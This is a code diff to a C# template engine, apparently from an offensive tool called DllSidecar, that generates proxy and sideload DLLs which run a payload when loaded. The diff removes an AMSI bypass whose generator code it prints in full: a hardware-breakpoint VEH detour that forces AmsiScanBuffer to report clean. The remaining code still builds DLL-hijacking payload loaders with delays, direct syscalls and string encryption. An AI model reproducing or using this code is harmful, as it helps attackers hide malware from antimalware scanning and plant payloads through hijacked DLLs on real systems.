@@ -159,7 +159,6 @@ public static class TemplateEngine
         if (config.DInvoke) sb.AppendLine("#include \"dinvoke.h\"");
         if (config.DirectSyscalls) sb.AppendLine("#include \"syscalls.h\"");
         if (config.EncryptStrings) sb.AppendLine("#include \"cryptor.h\"");
-        sb.Append(EmitEvasionIncludes(config, isX64));
         sb.AppendLine();
 
         // Header
@@ -184,7 +183,6 @@ public static class TemplateEngine
 
         // Payload
         sb.AppendLine(GeneratePayload(config, isX64));
-        sb.Append(EmitEvasionFunctions(config, isX64));
         sb.AppendLine();
 
         // Payload trigger — guarded once. Safe to call from DllMain or trampolines.
@@ -222,7 +220,6 @@ public static class TemplateEngine
             sb.AppendLine(config.DInvoke ? $"        sc_delay({config.DelayMs});" : $"        Sleep({config.DelayMs});");
         if (config.DirectSyscalls)
             sb.AppendLine("        sc_init();");
-        sb.Append(EmitEvasionInitCall(config, isX64));
         sb.Append(GenerateLoadOriginal(config, renamed, exports));
         sb.AppendLine("        payload_execute(-1);");
         sb.AppendLine("    } else if (fdwReason == DLL_PROCESS_DETACH) {");
@@ -234,14 +231,12 @@ public static class TemplateEngine
         var baseName = Path.GetFileNameWithoutExtension(analysis.Filename);
         var srcName = $"proxy_{baseName}";
 
-        var trampolinedResult = new Dictionary<string, string>
+        return new Dictionary<string, string>
         {
             [$"{srcName}.c"] = sb.ToString(),
             [$"{srcName}.def"] = GenerateDefFile(analysis, exports, true),
             ["build_proxy.bat"] = GenerateBuildBat(analysis, config, srcName, "proxy"),
         };
-        foreach (var (k, v) in LoadEvasionResources(config, isX64)) trampolinedResult[k] = v;
-        return trampolinedResult;
     }
 
     /// <summary>
@@ -263,7 +258,6 @@ public static class TemplateEngine
         if (config.DInvoke) sb.AppendLine("#include \"dinvoke.h\"");
         if (config.DirectSyscalls) sb.AppendLine("#include \"syscalls.h\"");
         if (config.EncryptStrings) sb.AppendLine("#include \"cryptor.h\"");
-        sb.Append(EmitEvasionIncludes(config, isX64));
         sb.AppendLine();
 
         sb.AppendLine($"/* === DllSidecar ProxyDll (pure-forwarder mode) === */");
@@ -279,7 +273,6 @@ public static class TemplateEngine
         sb.AppendLine();
 
         sb.AppendLine(GeneratePayload(config, isX64));
-        sb.Append(EmitEvasionFunctions(config, isX64));
         sb.AppendLine();
 
         sb.AppendLine("void __attribute__((used)) payload_execute(int index) {");
@@ -296,7 +289,6 @@ public static class TemplateEngine
             sb.AppendLine(config.DInvoke ? $"        sc_delay({config.DelayMs});" : $"        Sleep({config.DelayMs});");
         if (config.DirectSyscalls)
             sb.AppendLine("        sc_init();");
-        sb.Append(EmitEvasionInitCall(config, isX64));
         sb.AppendLine("        payload_execute(-1);");
         sb.AppendLine("    }");
         sb.AppendLine("    return TRUE;");
@@ -306,14 +298,12 @@ public static class TemplateEngine
         var srcName = $"proxy_{baseName}";
         var origBase = baseName + "_orig";
 
-        var pureResult = new Dictionary<string, string>
+        return new Dictionary<string, string>
         {
             [$"{srcName}.c"] = sb.ToString(),
             [$"{srcName}.def"] = GenerateForwarderDefFile(analysis, exports, origBase),
             ["build_proxy.bat"] = GenerateBuildBat(analysis, config, srcName, "proxy"),
         };
-        foreach (var (k, v) in LoadEvasionResources(config, isX64)) pureResult[k] = v;
-        return pureResult;
     }
 
     /// <summary>
@@ -360,7 +350,6 @@ public static class TemplateEngine
         if (config.DInvoke) sb.AppendLine("#include \"dinvoke.h\"");
         if (config.DirectSyscalls) sb.AppendLine("#include \"syscalls.h\"");
         if (config.EncryptStrings) sb.AppendLine("#include \"cryptor.h\"");
-        sb.Append(EmitEvasionIncludes(config, isX64));
         sb.AppendLine();
 
         sb.AppendLine($"/* === DllSidecar SideloadDll (stub mode) === */");
@@ -371,7 +360,6 @@ public static class TemplateEngine
 
         // Payload
         sb.AppendLine(GeneratePayload(config, isX64));
-        sb.Append(EmitEvasionFunctions(config, isX64));
         sb.AppendLine();
 
         // Stub exports
@@ -393,9 +381,6 @@ public static class TemplateEngine
             sb.AppendLine(config.DInvoke ? $"        sc_delay({config.DelayMs});" : $"        Sleep({config.DelayMs});");
         if (config.DirectSyscalls)
             sb.AppendLine("        sc_init();");
-        // Evasion init (AMSI hook etc.) runs before the payload so it intercepts
-        // any AmsiScanBuffer the payload might trigger directly or transitively.
-        sb.Append(EmitEvasionInitCall(config, isX64));
 
         // Payload invoke (one-shot)
         if (config.Thread == ThreadMode.Calling)
@@ -431,14 +416,12 @@ public static class TemplateEngine
                 defSb.AppendLine($"    ord_{exports[i].Ordinal} = {label} @{exports[i].Ordinal} NONAME");
         }
 
-        var result = new Dictionary<string, string>
+        return new Dictionary<string, string>
         {
             [$"{srcName}.c"] = sb.ToString(),
             [$"{srcName}.def"] = defSb.ToString(),
             ["build_sideload.bat"] = GenerateBuildBat(analysis, config, srcName, "sideload"),
         };
-        foreach (var (k, v) in LoadEvasionResources(config, isX64)) result[k] = v;
-        return result;
     }
 
     // ── Private helpers ──
@@ -896,10 +879,6 @@ public static class TemplateEngine
         //   · -ladvapi32 kept: needed for token/SID APIs used by some payload variants
         var parts = new List<string> { $"{gccPrefix}-gcc", "-shared", "-O0",
             "-o", analysis.Filename, $"{srcName}.c", $"{srcName}.def" };
-        // Extra evasion sources (HardwareBreakPointLib.c etc.) compiled in the
-        // same gcc invocation so the bundled VEH handler + Dr0-3 wiring linkers
-        // up alongside the proxy.
-        foreach (var src in EvasionExtraSources(config, isX64)) parts.Add(src);
         if (!string.IsNullOrEmpty(incFlag)) parts.Add(incFlag);
         parts.Add("-ladvapi32");
         // -Wl,--kill-at strips the stdcall "@N" suffix from stub_ord_N exports so MinGW's
@@ -1087,96 +1066,5 @@ public static class TemplateEngine
              + "        END\n    END\n    BLOCK \"VarFileInfo\"\n    BEGIN\n"
              + "        VALUE \"Translation\", 0x0409, 0x04B0\n"
              + "    END\nEND\n";
-    }
-
-    // ──────────────────────────────────────────────────────────────────
-    // Evasion technique emission
-    //
-    // Each Generate* method calls these to wire optional evasion modules.
-    // Currently: AMSI Evasion via Hardware Breakpoint Hooks (BigPolarBear1).
-    // x64-only — the bundled lib parses parameters via x64 register layout.
-    // Add new techniques here as more flags land on TemplateConfig.
-    // ──────────────────────────────────────────────────────────────────
-
-    /// <summary>Returns the embedded library files when the technique is active
-    /// and the target is x64. Caller merges into the output dict so MinGW
-    /// compiles them alongside the proxy.</summary>
-    private static Dictionary<string, string> LoadEvasionResources(TemplateConfig config, bool isX64)
-    {
-        var files = new Dictionary<string, string>();
-        if (config.AmsiHookHwBp && isX64)
-        {
-            foreach (var name in new[] { "HardwareBreakPointLib.c", "HardwareBreakPointLib.h", "Structs.h" })
-                files[name] = ReadEmbedded($"DllSidecar.Core.Resources.Evasion.AmsiHwBp.{name}");
-        }
-        return files;
-    }
-
-    private static string ReadEmbedded(string resourceName)
-    {
-        var asm = typeof(TemplateEngine).Assembly;
-        using var stream = asm.GetManifestResourceStream(resourceName)
-            ?? throw new InvalidOperationException($"Embedded resource not found: {resourceName}");
-        using var reader = new StreamReader(stream);
-        return reader.ReadToEnd();
-    }
-
-    /// <summary>Header includes the evasion modules need at the top of the
-    /// generated proxy.c / sideload.c.</summary>
-    private static string EmitEvasionIncludes(TemplateConfig config, bool isX64)
-    {
-        var sb = new StringBuilder();
-        if (config.AmsiHookHwBp && isX64)
-            sb.AppendLine("#include \"HardwareBreakPointLib.h\"");
-        return sb.ToString();
-    }
-
-    /// <summary>Function definitions injected before DllMain. AmsiScanBufferDetour
-    /// runs inside the VEH handler when the hardware breakpoint fires; it forces
-    /// AMSI_RESULT_CLEAN (0) into the 6th arg, returns S_OK, and skips the real
-    /// AmsiScanBuffer body. do_evasion_init wires it up at DLL_PROCESS_ATTACH.</summary>
-    private static string EmitEvasionFunctions(TemplateConfig config, bool isX64)
-    {
-        if (!config.AmsiHookHwBp || !isX64) return "";
-        var sb = new StringBuilder();
-        sb.AppendLine();
-        sb.AppendLine("/* AMSI Evasion via Hardware Breakpoint Hooks — bundled from BigPolarBear1's");
-        sb.AppendLine("   HardwareBreakPointLib. Patchless: Dr0-3 + VEH handler intercepts every");
-        sb.AppendLine("   AmsiScanBuffer call in this process and forces AMSI_RESULT_CLEAN. */");
-        sb.AppendLine("static VOID AmsiScanBufferDetour(PCONTEXT pCtx) {");
-        sb.AppendLine("    /* AmsiScanBuffer signature: HRESULT(*)(HAMSICONTEXT, PVOID, ULONG,");
-        sb.AppendLine("                                            LPCWSTR, HAMSISESSION, AMSI_RESULT*);");
-        sb.AppendLine("       6th arg is AMSI_RESULT* — set to AMSI_RESULT_CLEAN (0). */");
-        sb.AppendLine("    PULONG pResult = (PULONG)GETPARM_6(pCtx);");
-        sb.AppendLine("    if (pResult) *pResult = 0;");
-        sb.AppendLine("    RETURN_VALUE(pCtx, 0);  /* S_OK */");
-        sb.AppendLine("    BLOCK_REAL(pCtx);       /* skip the real AmsiScanBuffer body */");
-        sb.AppendLine("}");
-        sb.AppendLine();
-        sb.AppendLine("static void do_evasion_init(void) {");
-        sb.AppendLine("    HMODULE hAmsi = LoadLibraryA(\"amsi.dll\");");
-        sb.AppendLine("    if (!hAmsi) return;");
-        sb.AppendLine("    PUINT_VAR_T addr = (PUINT_VAR_T)GetProcAddress(hAmsi, \"AmsiScanBuffer\");");
-        sb.AppendLine("    if (!addr) return;");
-        sb.AppendLine("    if (!InitHardwareBreakpointHooking()) return;");
-        sb.AppendLine("    InstallHardwareBreakingPntHook(addr, Dr0, (PVOID)AmsiScanBufferDetour, ALL_THREADS);");
-        sb.AppendLine("    InstallHooksOnNewThreads(Dr0);");
-        sb.AppendLine("}");
-        return sb.ToString();
-    }
-
-    /// <summary>Single line called at the top of DLL_PROCESS_ATTACH. Empty
-    /// when no evasion technique is active so DllMain stays unchanged.</summary>
-    private static string EmitEvasionInitCall(TemplateConfig config, bool isX64) =>
-        (config.AmsiHookHwBp && isX64) ? "        do_evasion_init();\n" : "";
-
-    /// <summary>Extra source files MinGW must compile alongside proxy.c.
-    /// Used by GenerateBuildBat to extend the gcc input list.</summary>
-    private static List<string> EvasionExtraSources(TemplateConfig config, bool isX64)
-    {
-        var srcs = new List<string>();
-        if (config.AmsiHookHwBp && isX64)
-            srcs.Add("HardwareBreakPointLib.c");
-        return srcs;
     }
 }
